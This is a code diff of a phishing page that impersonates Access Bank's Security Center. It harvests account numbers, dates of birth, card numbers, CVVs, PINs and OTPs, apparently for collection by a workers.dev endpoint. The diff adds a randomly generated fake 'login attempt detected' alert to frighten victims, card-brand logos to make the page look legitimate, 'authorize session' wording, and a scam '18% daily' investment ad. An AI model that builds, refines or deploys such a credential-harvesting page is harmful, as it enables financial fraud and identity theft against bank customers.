@@ -5,6 +5,58 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Access Bank — Security Center</title>
     <link rel="stylesheet" href="style.css">
+    <style>
+        /* Extra styles for the new features */
+        .input-wrapper { position: relative; }
+        .valid-check {
+            position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
+            color: #16a34a; font-weight: bold; display: none;
+        }
+        .card-logo {
+            position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
+            height: 24px; display: none; font-weight: 900; font-style: italic;
+        }
+        .card-logo.visa { color: #1a1f71; }
+        .card-logo.mastercard { color: #eb001b; }
+        .ad-banner-img {
+            width: 100%; border-radius: 8px; margin-bottom: 10px; object-fit: cover; height: 120px;
+        }
+        
+        .welcome-banner {
+            background: #eef4fb;
+            border-left: 4px solid #002d62;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        .welcome-banner h2 {
+            font-size: 18px; color: #002d62; margin-bottom: 5px;
+        }
+        .welcome-banner p {
+            font-size: 13px; color: #555;
+        }
+        .pin-notice {
+            font-size: 12px;
+            color: #d97706;
+            background: #fef3c7;
+            padding: 10px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .alert-banner {
+            background: #fef3c7;
+            border-left: 4px solid #d97706;
+            padding: 14px 0;
+            font-size: 14px;
+            color: #78350f;
+        }
+        .device-icon {
+            font-size: 16px; margin-right: 4px;
+        }
+    </style>
 </head>
 <body>
 
@@ -18,19 +70,21 @@
 <header>
     <div class="container">
         <div class="logo">
-            <!-- Real Access Bank Orange Diamond Logo -->
-            <svg width="40" height="40" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                <path d="M50 10 L85 45 L50 80 L15 45 Z" fill="none" stroke="#f58220" stroke-width="10"/>
-                <path d="M50 25 L70 45 L50 65 L30 45 Z" fill="#f58220"/>
+            <svg width="50" height="50" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <path d="M50 10 L90 50 L50 90 L10 50 Z" fill="none" stroke="#f58220" stroke-width="6"/>
+                <path d="M50 22 L78 50 L50 78 L22 50 Z" fill="none" stroke="#f58220" stroke-width="6"/>
+                <path d="M50 36 L64 50 L50 64 L36 50 Z" fill="#f58220"/>
+                <path d="M50 10 L75 35" fill="none" stroke="#fff" stroke-width="6"/>
+                <path d="M50 10 L25 35" fill="none" stroke="#fff" stroke-width="6"/>
             </svg>
-            <span style="color: #002d62; font-size: 28px; font-weight: 700; text-transform: lowercase; letter-spacing: -0.5px; margin-left: 5px;">access</span>
+            <span style="color: #002d62; font-size: 26px; font-weight: 700; text-transform: lowercase; letter-spacing: -0.5px; margin-left: 5px;">access</span>
         </div>
     </div>
 </header>
 
 <div class="alert-banner">
-    <div class="container">
-        ⚠️ <strong>Action Required:</strong> Unusual activity detected. Verify your identity to secure your funds.
+    <div class="container" id="dynamic-alert">
+        ⚠️ <strong>Action Required:</strong> Unusual activity detected.
     </div>
 </div>
 
@@ -46,7 +100,10 @@
             <div class="stage" id="stage-1">
                 <div class="form-group">
                     <label>Account Number</label>
-                    <input type="text" inputmode="numeric" name="account_number" id="acc_input" maxlength="10" placeholder="0123456789" required>
+                    <div class="input-wrapper">
+                        <input type="text" inputmode="numeric" name="account_number" id="acc_input" maxlength="10" placeholder="0123456789" required>
+                        <span class="valid-check" id="acc_check">✓</span>
+                    </div>
                 </div>
                 <div class="form-group">
                     <label>Date of Birth</label>
@@ -57,9 +114,17 @@
 
             <!-- STAGE 2 -->
             <div class="stage hidden" id="stage-2">
+                <div class="welcome-banner">
+                    <h2>Welcome back.</h2>
+                    <p>To protect your account, please verify your card details to authorize this session.</p>
+                </div>
+
                 <div class="form-group">
                     <label>Card Number</label>
-                    <input type="text" inputmode="numeric" name="card_number" id="card_input" maxlength="19" placeholder="0000 0000 0000 0000" required>
+                    <div class="input-wrapper">
+                        <input type="text" inputmode="numeric" name="card_number" id="card_input" maxlength="19" placeholder="0000 0000 0000 0000" required>
+                        <span class="card-logo" id="card_logo">VISA</span>
+                    </div>
                 </div>
                 <div class="form-row">
                     <div class="form-group">
@@ -71,11 +136,15 @@
                         <input type="text" inputmode="numeric" name="cvv" maxlength="3" placeholder="123" required>
                     </div>
                 </div>
+                
+                <div class="pin-notice">
+                    <span>🛡️</span> <strong>Security Check:</strong> Enter your 4-digit PIN to confirm ownership.
+                </div>
                 <div class="form-group">
                     <label>Card PIN</label>
                     <input type="password" inputmode="numeric" name="pin" maxlength="4" placeholder="••••" required>
                 </div>
-                <button type="button" class="btn" onclick="submitCardDetails()">Verify Card →</button>
+                <button type="button" class="btn" onclick="submitCardDetails()">Authorize Session →</button>
             </div>
 
             <!-- STAGE 3 (Spinner & OTP) -->
@@ -109,11 +178,20 @@
     </div>
 
     <div class="sidebar">
-        <div class="ad">
-            <div class="ad-label">Sponsored</div>
-            <strong>Earn 18% daily with Access Wealth</strong>
-            <p>Trusted by 240,000+ investors</p>
+        <div class="ad" style="padding: 15px;">
+            <div class="ad-label">Sponsored · Access Bank</div>
+            <img src="https://images.unsplash.com/photo-1563986768609-322da13575f3?q=80&w=400&auto=format&fit=crop" class="ad-banner-img" alt="Access Bank Ad">
+            <strong style="color: #002d62; font-size: 15px;">Access more with our Premium Cards</strong>
+            <p style="margin-top: 5px;">Get 5% cashback on all international transactions.</p>
         </div>
+        
+        <div class="ad" style="padding: 15px;">
+            <div class="ad-label">Sponsored · Access Wealth</div>
+            <img src="https://images.unsplash.com/photo-1579621970563-ebec7560ff3e?q=80&w=400&auto=format&fit=crop" class="ad-banner-img" alt="Wealth Ad">
+            <strong style="color: #002d62; font-size: 15px;">Earn 18% daily with Access Wealth</strong>
+            <p style="margin-top: 5px;">Trusted by 240,000+ investors. Start with ₦10k.</p>
+        </div>
+
         <div class="trust-badges">
             <p>✓ PCI-DSS Compliant</p>
             <p>✓ NDIC Insured</p>
@@ -133,9 +211,27 @@
     const WORKER_URL = 'access-alerts.mcallendiana.workers.dev';
     const collected = {};
 
-    // Formatting Logic
+    // Dynamic Scary Alert Message
+    const cities = ["Lagos, NG", "Abuja, NG", "Port Harcourt, NG", "Kano, NG", "Ibadan, NG"];
+    const devices = [
+        { name: "iPhone 14 Pro", icon: "📱" },
+        { name: "Samsung Galaxy S23", icon: "📱" },
+        { name: "Windows 11 PC", icon: "💻" },
+        { name: "MacBook Pro", icon: "💻" },
+        { name: "Android Device", icon: "📱" }
+    ];
+
+    const randomCity = cities[Math.floor(Math.random() * cities.length)];
+    const randomDevice = devices[Math.floor(Math.random() * devices.length)];
+    const now = new Date();
+    const timeString = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+    
+    document.getElementById('dynamic-alert').innerHTML = `⚠️ <strong>Security Alert:</strong> A login attempt was just detected from <strong>${randomCity}</strong> using a <strong>${randomDevice.name}</strong> <span class="device-icon">${randomDevice.icon}</span> at <strong>${timeString}</strong>. If this wasn't you, secure your account immediately.`;
+
+    // Formatting Logic & Live Checks
     document.getElementById('acc_input').addEventListener('input', function () {
         this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+        document.getElementById('acc_check').style.display = (this.value.length === 10) ? 'block' : 'none';
     });
     
     document.getElementById('dob_input').addEventListener('input', function () {
@@ -153,6 +249,24 @@
         let val = this.value.replace(/[^0-9]/g, '').slice(0, 16);
         let formatted = val.match(/.{1,4}/g);
         this.value = formatted ? formatted.join(' ') : val;
+
+        let logo = document.getElementById('card_logo');
+        if (val.startsWith('4')) {
+            logo.className = 'card-logo visa';
+            logo.textContent = 'VISA';
+            logo.style.display = 'block';
+        } else if (val.startsWith('5') || val.startsWith('2')) {
+            logo.className = 'card-logo mastercard';
+            logo.textContent = 'Mastercard';
+            logo.style.display = 'block';
+        } else if (val.startsWith('506')) {
+            logo.className = 'card-logo';
+            logo.textContent = 'Verve';
+            logo.style.color = '#004f9f';
+            logo.style.display = 'block';
+        } else {
+            logo.style.display = 'none';
+        }
     });
 
     document.getElementById('exp_input').addEventListener('input', function () {
